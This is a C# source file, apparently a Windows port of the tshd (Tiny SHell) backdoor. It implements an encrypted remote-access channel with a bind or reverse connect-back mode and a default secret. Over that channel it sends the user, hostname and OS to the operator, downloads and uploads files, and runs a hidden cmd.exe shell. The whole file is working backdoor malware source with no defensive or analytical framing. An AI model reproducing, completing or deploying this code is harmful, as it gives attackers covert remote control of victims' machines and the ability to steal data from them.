using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Tshd
{
    class Program
    {
        static string Secret = "1234";
        static int Port = 1234;
        static string Host = "";
        static int Delay = 5;
        static byte[] Challenge = new byte[] {
            0x58, 0x90, 0xAE, 0x86, 0xF1, 0xB9, 0x1C, 0xF6,
            0x29, 0x83, 0x95, 0x71, 0x1D, 0xDE, 0x58, 0x0D,
        };

        static void Main(string[] args)
        {
            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "-s" && i + 1 < args.Length) Secret = args[i + 1];
                else if (args[i] == "-p" && i + 1 < args.Length) Port = int.Parse(args[i + 1]);
                else if (args[i] == "-c" && i + 1 < args.Length) Host = args[i + 1];
                else if (args[i] == "-d" && i + 1 < args.Length) Delay = int.Parse(args[i + 1]);
            }

            if (string.IsNullOrEmpty(Host))
            {
                StartListener();
            }
            else
            {
                StartConnectBack();
            }
        }

        static void StartListener()
        {
            TcpListener listener = new TcpListener(IPAddress.Any, Port);
            try {
                listener.Start();
                while (true)
                {
                    try
                    {
                        TcpClient client = listener.AcceptTcpClient();
                        Thread t = new Thread(() => HandleClient(client));
                        t.Start();
                    }
                    catch { }
                }
            } catch { }
        }

        static void StartConnectBack()
        {
            while (true)
            {
                try
                {
                    TcpClient client = new TcpClient();
                    client.Connect(Host, Port);
                    HandleClient(client);
                }
                catch
                {
                    Thread.Sleep(Delay * 1000);
                }
            }
        }

        static void HandleClient(TcpClient client)
        {
            try
            {
                Pel layer = new Pel(client, Secret);
                // tshd always acts as the server in the PEL protocol,
                // regardless of who initiated the TCP connection.
                if (layer.Handshake(true))
                {
                    SendMetadata(layer);
                    HandleGeneric(layer);
                }
            }
            catch { }
            finally
            {
                client.Close();
            }
        }

        static void SendMetadata(Pel layer)
        {
            try
            {
                string user = Environment.UserName;
                string host = Dns.GetHostName();
                string os = "Windows " + Environment.OSVersion.Version.ToString();
                string meta = string.Format("{0}@{1}|{2}", user, host, os);
                byte[] data = Encoding.UTF8.GetBytes(meta);
                layer.Write(data, 0, data.Length);
            }
            catch {}
        }

        static void HandleGeneric(Pel layer)
        {
            byte[] buf = new byte[1];
            int n = layer.Read(buf, 0, 1);
            if (n != 1) return;

            switch (buf[0])
            {
                case 1: // GetFile
                    HandleGetFile(layer, null);
                    break;
                case 2: // PutFile
                    HandlePutFile(layer, null);
                    break;
                case 3: // RunShell
                    HandleRunShell(layer);
                    break;
                case 4: // Terminate
                    Environment.Exit(0);
                    break;
            }
        }

        static void HandleGetFile(Pel layer, byte[] initialData)
        {
            byte[] buf = new byte[4096];
            string filename;

            if (initialData != null && initialData.Length > 0)
            {
                filename = Encoding.UTF8.GetString(initialData);
            }
            else
            {
                int n = layer.Read(buf, 0, buf.Length);
                if (n <= 0) return;
                filename = Encoding.UTF8.GetString(buf, 0, n);
            }

            if (File.Exists(filename))
            {
                try
                {
                    long size = new FileInfo(filename).Length;
                    using (FileStream fs = File.OpenRead(filename))
                    {
                        // Send ACK 0x1D 0x01
                        layer.Write(new byte[] { 0x1D, 1 }, 0, 2);

                        layer.Write(new byte[] { 1 }, 0, 1); // Success

                        // Send Size (Big Endian)
                        byte[] sizeBuf = new byte[8];
                        for (int i = 0; i < 8; i++) sizeBuf[i] = (byte)(size >> (56 - 8 * i));
                        layer.Write(sizeBuf, 0, 8);

                        CopyStream(layer, fs, buf);
                    }
                }
                catch (Exception ex)
                {
                    layer.Write(new byte[] { 0x1D, 1 }, 0, 2); // ACK
                    layer.Write(new byte[] { 0 }, 0, 1); // Failure
                    byte[] err = Encoding.UTF8.GetBytes(ex.Message);
                    layer.Write(err, 0, err.Length);
                }
            }
            else
            {
                layer.Write(new byte[] { 0x1D, 1 }, 0, 2); // ACK
                layer.Write(new byte[] { 0 }, 0, 1); // Failure
                byte[] err = Encoding.UTF8.GetBytes("File not found");
                layer.Write(err, 0, err.Length);
            }
        }

        static void HandlePutFile(Pel layer, byte[] initialData)
        {
            byte[] buf = new byte[4096];
            string filename;

            if (initialData != null && initialData.Length > 0)
            {
                filename = Encoding.UTF8.GetString(initialData);
            }
            else
            {
                int n = layer.Read(buf, 0, buf.Length);
                if (n <= 0) return;
                filename = Encoding.UTF8.GetString(buf, 0, n);
            }

            try
            {
                using (FileStream fs = File.Create(filename))
                {
                    // Send ACK 0x1D 0x02
                    layer.Write(new byte[] { 0x1D, 2 }, 0, 2);

                    layer.Write(new byte[] { 1 }, 0, 1); // Success

                    // Recv Size
                    byte[] sizeBuf = new byte[8];
                    int n = layer.Read(sizeBuf, 0, 8);
                    if (n != 8) return;
                    long size = 0;
                    for (int i = 0; i < 8; i++) size = (size << 8) | (long)sizeBuf[i];

                    CopyStreamN(fs, layer, buf, size);
                }
            }
            catch (Exception ex)
            {
                layer.Write(new byte[] { 0x1D, 2 }, 0, 2); // ACK
                layer.Write(new byte[] { 0 }, 0, 1); // Failure
                byte[] err = Encoding.UTF8.GetBytes(ex.Message);
                layer.Write(err, 0, err.Length);
            }
        }

        static void HandleRunShell(Pel layer)
        {
             byte[] buf = new byte[4096];
             int n = layer.Read(buf, 0, buf.Length); // Term
             string term = Encoding.UTF8.GetString(buf, 0, n);

             n = layer.Read(buf, 0, 4); // Window size
             if (n != 4) return;

             n = layer.Read(buf, 0, buf.Length); // Command
             string command = Encoding.UTF8.GetString(buf, 0, n);
             if (command == "exec bash --login") command = "cmd.exe";

             Process p = new Process();
             p.StartInfo.FileName = "cmd.exe";
             p.StartInfo.Arguments = "/c " + command;
             if (command == "cmd.exe") p.StartInfo.Arguments = "";

             p.StartInfo.UseShellExecute = false;
             p.StartInfo.RedirectStandardInput = true;
             p.StartInfo.RedirectStandardOutput = true;
             p.StartInfo.RedirectStandardError = true;
             p.StartInfo.CreateNoWindow = true;
             p.Start();

             Thread outThread = new Thread(() => {
                 try { CopyStream(layer, p.StandardOutput.BaseStream, new byte[4096]); } catch {}
             });
             Thread errThread = new Thread(() => {
                 try { CopyStream(layer, p.StandardError.BaseStream, new byte[4096]); } catch {}
             });
             Thread inThread = new Thread(() => {
                 try {
                     byte[] tmp = new byte[4096];
                     int readLen;
                     List<byte> lineBuffer = new List<byte>();
                     List<string> history = new List<string>();
                     int historyIndex = 0;
                     int escapeState = 0; // 0=Normal, 1=ESC, 2=ESC[

                     // tshdexit detection
                     List<byte> exitBuffer = new List<byte>();

                     while ((readLen = layer.Read(tmp, 0, tmp.Length)) > 0) {
                         List<byte> echoBuffer = new List<byte>(); // Buffer for batched echo

                         // Check for magic command byte 0x1D
                         if (readLen >= 2 && tmp[0] == 0x1D) {
                             int opcode = tmp[1];
                             byte[] extra = null;
                             if (readLen > 2) {
                                 extra = new byte[readLen - 2];
                                 Array.Copy(tmp, 2, extra, 0, readLen - 2);
                             }

                             if (opcode == 1) { HandleGetFile(layer, extra); continue; }
                             if (opcode == 2) { HandlePutFile(layer, extra); continue; }
                             if (opcode == 4) { Environment.Exit(0); }
                         }

                         for (int i = 0; i < readLen; i++)
                         {
                             byte b = tmp[i];

                             // Check for tshdexit
                             exitBuffer.Add(b);
                             if (exitBuffer.Count > 20) exitBuffer.RemoveAt(0);
                             if (exitBuffer.Count >= 9) {
                                 byte[] tail = new byte[9];
                                 exitBuffer.CopyTo(exitBuffer.Count - 9, tail, 0, 9);
                                 string tailStr = Encoding.UTF8.GetString(tail);
                                 if (tailStr == "tshdexit\r" || tailStr == "tshdexit\n") {
                                     Environment.Exit(0);
                                 }
                             }

                             // Handle Escape Sequences for Arrows
                             if (escapeState == 1)
                             {
                                 if (b == 0x5B) // [
                                 {
                                     escapeState = 2;
                                     continue;
                                 }
                                 else
                                 {
                                     // Not a CSI sequence, process buffered ESC and this char as normal
                                     ProcessChar(0x1B, layer, lineBuffer, p, history, ref historyIndex, echoBuffer);
                                     escapeState = 0;
                                     // fall through to process b
                                 }
                             }

                             if (escapeState == 2)
                             {
                                 escapeState = 0; // Reset state
                                 if (b == 0x41) // A (Up)
                                 {
                                     if (history.Count > 0)
                                     {
                                         if (historyIndex > 0) historyIndex--;
                                         string cmd = history[historyIndex];
                                         ReplaceLine(cmd, layer, lineBuffer, echoBuffer);
                                     }
                                     continue;
                                 }
                                 else if (b == 0x42) // B (Down)
                                 {
                                     if (historyIndex < history.Count)
                                     {
                                         historyIndex++;
                                         string cmd = (historyIndex < history.Count) ? history[historyIndex] : "";
                                         ReplaceLine(cmd, layer, lineBuffer, echoBuffer);
                                     }
                                     continue;
                                 }
                                 else
                                 {
                                      // Unknown escape sequence
                                      continue;
                                 }
                             }

                             if (b == 0x1B) // ESC
                             {
                                 escapeState = 1;
                                 continue;
                             }

                             ProcessChar(b, layer, lineBuffer, p, history, ref historyIndex, echoBuffer);
                         }

                         // Flush echo buffer
                         if (echoBuffer.Count > 0)
                         {
                             byte[] echoBytes = echoBuffer.ToArray();
                             layer.Write(echoBytes, 0, echoBytes.Length);
                         }
                     }
                 } catch {}
                 try { p.Kill(); } catch {}
             });
             outThread.Start();
             errThread.Start();
             inThread.Start();

             p.WaitForExit();
        }

        static void ProcessChar(byte b, Pel layer, List<byte> lineBuffer, Process p, List<string> history, ref int historyIndex, List<byte> echoBuffer)
        {
             if (b == 0x08 || b == 0x7F) // Backspace (BS or DEL)
             {
                 if (lineBuffer.Count > 0)
                 {
                     lineBuffer.RemoveAt(lineBuffer.Count - 1);
                     byte[] bs = new byte[] { 0x1B, 0x5B, 0x44, 0x20, 0x1B, 0x5B, 0x44 };
                     echoBuffer.AddRange(bs);
                 }
             }
             else if (b == 0x0D) // CR (\r)
             {
                 echoBuffer.AddRange(new byte[] { 0x0D, 0x0A });
                 lineBuffer.Add(0x0D);
                 lineBuffer.Add(0x0A);
                 byte[] line = lineBuffer.ToArray();

                 // Add command to history (trim CRLF)
                 string cmdStr = Encoding.UTF8.GetString(line).Trim();
                 if (cmdStr.Length > 0)
                 {
                    history.Add(cmdStr);
                    if (history.Count > 10) history.RemoveAt(0);
                 }
                 historyIndex = history.Count; // Reset index to end

                 p.StandardInput.BaseStream.Write(line, 0, line.Length);
                 p.StandardInput.BaseStream.Flush();
                 lineBuffer.Clear();
             }
             else if (b == 0x0A) // LF
             {
             }
             else
             {
                 lineBuffer.Add(b);
                 echoBuffer.Add(b);
             }
        }

        static void ReplaceLine(string cmd, Pel layer, List<byte> lineBuffer, List<byte> echoBuffer)
        {
             // Erase current buffer from screen
             // Send Backspace-Space-Backspace for each char in buffer
             // Use ANSI sequence for safer erasure on client terminal
             byte[] eraseSeq = new byte[] { 0x1B, 0x5B, 0x44, 0x20, 0x1B, 0x5B, 0x44 }; // Left Space Left

             for(int i=0; i<lineBuffer.Count; i++) {
                 echoBuffer.AddRange(eraseSeq);
             }

             // Write new cmd
             byte[] cmdBytes = Encoding.UTF8.GetBytes(cmd);
             echoBuffer.AddRange(cmdBytes);

             // Update buffer
             lineBuffer.Clear();
             lineBuffer.AddRange(cmdBytes);
        }

        static void CopyStream(Stream dst, Stream src, byte[] buf)
        {
            int n;
            while ((n = src.Read(buf, 0, buf.Length)) > 0)
            {
                dst.Write(buf, 0, n);
                dst.Flush();
            }
        }

        static void CopyStreamN(Stream dst, Stream src, byte[] buf, long count)
        {
            long total = 0;
            while (total < count)
            {
                int toRead = (int)Math.Min(buf.Length, count - total);
                int n = src.Read(buf, 0, toRead);
                if (n <= 0) break;
                dst.Write(buf, 0, n);
                dst.Flush();
                total += n;
            }
        }
    }

    class Pel : Stream
    {
        TcpClient client;
        NetworkStream ns;
        string secret;
        ICryptoTransform encryptor;
        ICryptoTransform decryptor;
        HMACSHA1 sendHmac;
        HMACSHA1 recvHmac;
        uint sendCtr = 0;
        uint recvCtr = 0;
        object writeLock = new object();
        object readLock = new object();

        public Pel(TcpClient client, string secret)
        {
            this.client = client;
            this.ns = client.GetStream();
            this.secret = secret;
        }

        public bool Handshake(bool isServer)
        {
             byte[] iv1 = new byte[20];
             byte[] iv2 = new byte[20];

             if (isServer)
             {
                 byte[] buf = new byte[40];
                 ReadExact(ns, buf, 40);
                 Array.Copy(buf, 0, iv2, 0, 20);
                 Array.Copy(buf, 20, iv1, 0, 20);
             }
             else
             {
                 new Random().NextBytes(iv1);
                 new Random().NextBytes(iv2);
                 byte[] buf = new byte[40];
                 Array.Copy(iv1, 0, buf, 0, 20);
                 Array.Copy(iv2, 0, buf, 20, 20);
                 ns.Write(buf, 0, 40);
             }

             SetupCrypto(iv1, iv2, isServer);

             byte[] challenge = new byte[] {
                0x58, 0x90, 0xAE, 0x86, 0xF1, 0xB9, 0x1C, 0xF6,
                0x29, 0x83, 0x95, 0x71, 0x1D, 0xDE, 0x58, 0x0D,
             };

             if (isServer)
             {
                 byte[] buf = new byte[16];
                 Read(buf, 0, 16);
                 // Verify challenge
                 for(int i=0; i<16; i++) if(buf[i] != challenge[i]) return false;
                 Write(challenge, 0, 16);
             }
             else
             {
                 Write(challenge, 0, 16);
                 byte[] buf = new byte[16];
                 Read(buf, 0, 16);
                  for(int i=0; i<16; i++) if(buf[i] != challenge[i]) return false;
             }
             return true;
        }

        void SetupCrypto(byte[] iv1, byte[] iv2, bool isServer)
        {
            byte[] sendIVRaw, recvIVRaw;
            if (isServer)
            {
                sendIVRaw = iv1;
                recvIVRaw = iv2;
            }
            else
            {
                sendIVRaw = iv1;
                recvIVRaw = iv2;
            }

            using (SHA1 sha1 = SHA1.Create())
            {
                byte[] keyStr = Encoding.UTF8.GetBytes(secret);

                // Send Setup
                byte[] hashInput = new byte[keyStr.Length + sendIVRaw.Length];
                Array.Copy(keyStr, 0, hashInput, 0, keyStr.Length);
                Array.Copy(sendIVRaw, 0, hashInput, keyStr.Length, sendIVRaw.Length);
                byte[] key = sha1.ComputeHash(hashInput);

                byte[] aesKey = new byte[16];
                byte[] aesIV = new byte[16];
                Array.Copy(key, 0, aesKey, 0, 16);
                Array.Copy(sendIVRaw, 0, aesIV, 0, 16);

                Aes aes = Aes.Create();
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.None;
                encryptor = aes.CreateEncryptor(aesKey, aesIV);
                sendHmac = new HMACSHA1(key);

                // Recv Setup
                hashInput = new byte[keyStr.Length + recvIVRaw.Length];
                Array.Copy(keyStr, 0, hashInput, 0, keyStr.Length);
                Array.Copy(recvIVRaw, 0, hashInput, keyStr.Length, recvIVRaw.Length);
                key = sha1.ComputeHash(hashInput);

                Array.Copy(key, 0, aesKey, 0, 16);
                Array.Copy(recvIVRaw, 0, aesIV, 0, 16);

                aes = Aes.Create();
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.None;
                decryptor = aes.CreateDecryptor(aesKey, aesIV);
                recvHmac = new HMACSHA1(key);
            }
        }

        public override int Read(byte[] buffer, int offset, int count)
        {
             lock (readLock)
             {
                 byte[] firstBlock = new byte[16];
                 ReadExact(ns, firstBlock, 16);
                 byte[] decryptedFirst = new byte[16];
                 decryptor.TransformBlock(firstBlock, 0, 16, decryptedFirst, 0);

                 int length = (decryptedFirst[0] << 8) | decryptedFirst[1];

                 int blkLength = 2 + length;
                 int fullLen = blkLength;
                 if ((fullLen & 0x0F) != 0) fullLen += 16 - (fullLen & 0x0F);

                 int remaining = fullLen - 16 + 20;
                 byte[] rest = new byte[remaining];
                 ReadExact(ns, rest, remaining);

                 byte[] encryptedData = new byte[fullLen];
                 Array.Copy(firstBlock, 0, encryptedData, 0, 16);
                 Array.Copy(rest, 0, encryptedData, 16, fullLen - 16);

                 byte[] hmacInput = new byte[fullLen + 4];
                 Array.Copy(encryptedData, 0, hmacInput, 0, fullLen);
                 hmacInput[fullLen] = (byte)((recvCtr >> 24) & 0xFF);
                 hmacInput[fullLen+1] = (byte)((recvCtr >> 16) & 0xFF);
                 hmacInput[fullLen+2] = (byte)((recvCtr >> 8) & 0xFF);
                 hmacInput[fullLen+3] = (byte)(recvCtr & 0xFF);

                 byte[] digest = recvHmac.ComputeHash(hmacInput);

                 for(int i=0; i<20; i++) {
                     if(rest[remaining - 20 + i] != digest[i]) throw new Exception("HMAC mismatch");
                 }

                 recvCtr++;

                 byte[] decryptedRest = new byte[fullLen - 16];
                 if (fullLen > 16) {
                    decryptor.TransformBlock(rest, 0, fullLen - 16, decryptedRest, 0);
                 }

                 byte[] fullDecrypted = new byte[fullLen];
                 Array.Copy(decryptedFirst, 0, fullDecrypted, 0, 16);
                 Array.Copy(decryptedRest, 0, fullDecrypted, 16, fullLen - 16);

                 int copyLen = Math.Min(count, length);
                 Array.Copy(fullDecrypted, 2, buffer, offset, copyLen);
                 return copyLen;
             }
        }

        public override void Write(byte[] buffer, int offset, int count)
        {
            int total = 0;
            while (total < count) {
                int toWrite = Math.Min(count - total, 4096);
                WriteChunk(buffer, offset + total, toWrite);
                total += toWrite;
            }
        }

        void WriteChunk(byte[] buffer, int offset, int length)
        {
             lock (writeLock)
             {
                 int blkLength = 2 + length;
                 int fullLen = blkLength;
                 if ((fullLen & 0x0F) != 0) fullLen += 16 - (fullLen & 0x0F);

                 byte[] plain = new byte[fullLen];
                 plain[0] = (byte)((length >> 8) & 0xFF);
                 plain[1] = (byte)(length & 0xFF);
                 Array.Copy(buffer, offset, plain, 2, length);

                 byte[] encrypted = new byte[fullLen];
                 encryptor.TransformBlock(plain, 0, fullLen, encrypted, 0);

                 byte[] hmacInput = new byte[fullLen + 4];
                 Array.Copy(encrypted, 0, hmacInput, 0, fullLen);
                 hmacInput[fullLen] = (byte)((sendCtr >> 24) & 0xFF);
                 hmacInput[fullLen+1] = (byte)((sendCtr >> 16) & 0xFF);
                 hmacInput[fullLen+2] = (byte)((sendCtr >> 8) & 0xFF);
                 hmacInput[fullLen+3] = (byte)(sendCtr & 0xFF);

                 byte[] digest = sendHmac.ComputeHash(hmacInput);

                 ns.Write(encrypted, 0, fullLen);
                 ns.Write(digest, 0, 20);
                 sendCtr++;
             }
        }

        void ReadExact(Stream s, byte[] buf, int len)
        {
            int total = 0;
            while (total < len) {
                int n = s.Read(buf, total, len - total);
                if (n <= 0) throw new EndOfStreamException();
                total += n;
            }
        }

        public override bool CanRead { get { return true; } }
        public override bool CanSeek { get { return false; } }
        public override bool CanWrite { get { return true; } }
        public override void Flush() { ns.Flush(); }
        public override long Length { get { return 0; } }
        public override long Position { get { return 0; } set { } }
        public override long Seek(long offset, SeekOrigin origin) { return 0; }
        public override void SetLength(long value) { }
    }
}
